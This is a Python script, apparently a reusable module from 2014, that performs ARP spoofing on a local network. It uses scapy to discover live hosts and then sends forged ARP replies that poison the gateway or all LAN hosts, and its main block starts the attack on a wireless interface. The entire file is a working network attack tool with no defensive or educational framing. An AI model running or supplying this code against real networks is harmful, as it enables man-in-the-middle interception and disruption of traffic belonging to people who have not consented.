#! /usr/bin/env python
# coding:utf-8

from scapy.all import ARP, arping, send
import sys
import re
import os
import socket
import fcntl
import struct
import time
from multiprocessing import Process


class ARP_ATTACK(Process):

    """@author:DrWrong
       email: yuhangchaney@gmail.com
       time: 2014.04.13
       a module use for arp attack
       usage:
                arp=ARP_ATTACK(attact_type=1,
                               arp_ip=None,arp_mac=None,
                               target_host=None,
                               ifname='eth1'
                               sleeptime=0,
                               timeout=5)
                                             -- init a arp attack
                        arp.start()            -- start arp attack
                        arp.stop()           -- stop arp attack

                keyword arguments:
                        arp_ip     --ip address in a arp replay packet,
                                                 use for arp attack it should be a list
                        arp_mac    --mac address in a arp replay packet,
                                     use for arp attack
                        attact_type --target choosen 0-gateway 1-pcs
                        target_host --the target ips and macs to send packet to,
                                                if don't provide, and attact_type is 0
                                                then target_host will set to the geteway
                                                ip address
                                                if attact_type is 1 then target_host will
                                                set to the alive ips in the same LAN
                        ifname      -- the interface used to send packet with,
                                                if dont't provide, interface will set to the
                                                interface that can route you traffic to default
                                                gateway
                        sleeptime   -- the sleeptime between per packet send
                        timeout     -- get default timeout
                                    """

    def __init__(self,
                 attact_type=1,
                 arp_ip=None,
                 arp_mac=None,
                 target_host=None,
                 ifname='eth1',
                 sleeptime=0,
                 timeout=5,
                 *arg, **kwargs):
        ''' init '''
        super(ARP_ATTACK, self).__init__(*arg, **kwargs)
        self.arp_ip = arp_ip
        self.arp_mac = arp_mac
        self.attact_type = attact_type
        self.target_host = target_host
        self.ifname = ifname
        self.sleeptime = sleeptime
        self.timeout = timeout

        # give initial value of some attr
        if not self.target_host:
            if self.attact_type == 0:
                self.target_host = self.get_gateway_ip()
            else:
                self.target_host = self.get_host()
        if not self.arp_ip:
            if self.attact_type == 0:
                self.arp_ip = self.get_host().keys()
            else:
                self.arp_ip = self.get_gateway_ip().keys()

        if not self.arp_mac:
            self.arp_mac = self.get_hw_address()
        self.daemon = True

    def get_gateway_ip(self):
        t = os.popen('route -n')
        for i in t:
            if i.startswith('0.0.0.0'):
                r = re.split('\s+', i)
                ip = r[1]
                return {ip: self.get_host()[ip]}

    # get ips alive in the line
    def get_host(self):
        hostip = self.get_ipaddress()
        mask = str(self.get_netmask())
        res = arping(
            hostip + '/' + mask, timeout=self.timeout, iface=self.ifname)
        hostlist = {}
        for eachenty in res[0].res:
            ip = eachenty[0].pdst
            hostlist[ip] = eachenty[1].src
        return hostlist

    def get_ipaddress(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('24s', self.ifname))[20:24])

    def get_netmask(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        mask = fcntl.ioctl(
            s.fileno(),
            0x891b,  # SIOCGIIFNETMASK
            struct.pack('24s', self.ifname))[20:24]
        maskinterg = struct.unpack('i', mask)[0]
        return self.hamming_weight(maskinterg)

    def get_hw_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(
            s.fileno(), 0x8927, struct.pack('24s', self.ifname))
        hwaddr = []
        for char in info[18:24]:
            hdigit = '%02x' % struct.unpack('B', char)[0]
            hwaddr.append(hdigit)
        return ':'.join(hwaddr)

    # hamming_weight 算法 获取整数n转换成的二进制数中1有个数
    def hamming_weight(self, n):
        n = (n & 0x55555555) + ((n >> 1) & 0x55555555)
        n = (n & 0x33333333) + ((n >> 2) & 0x33333333)
        n = (n & 0x0f0f0f0f) + ((n >> 4) & 0x0f0f0f0f)
        n = (n & 0x00ff00ff) + ((n >> 8) & 0x00ff00ff)
        n = (n & 0x0000ffff) + ((n >> 16) & 0x0000ffff)
        return n

    def arp_hack(self, arp_ip, dsthw, dstip):
        t = ARP(op=2,
                hwsrc=self.arp_mac,
                psrc=arp_ip,
                hwdst=dsthw,
                pdst=dstip)
        send(t, iface=self.ifname)

    def run(self):

        for arp_ip in self.arp_ip:
            for dstip, dsthw in self.target_host.iteritems():
                self.arp_hack(arp_ip, dsthw, dstip)
                time.sleep(self.sleeptime)
        time.sleep(self.sleeptime)


if __name__ == '__main__':
    attack = ARP_ATTACK(ifname='wlan0')
    attack.start()
    time.sleep(10)
    attack.stop()
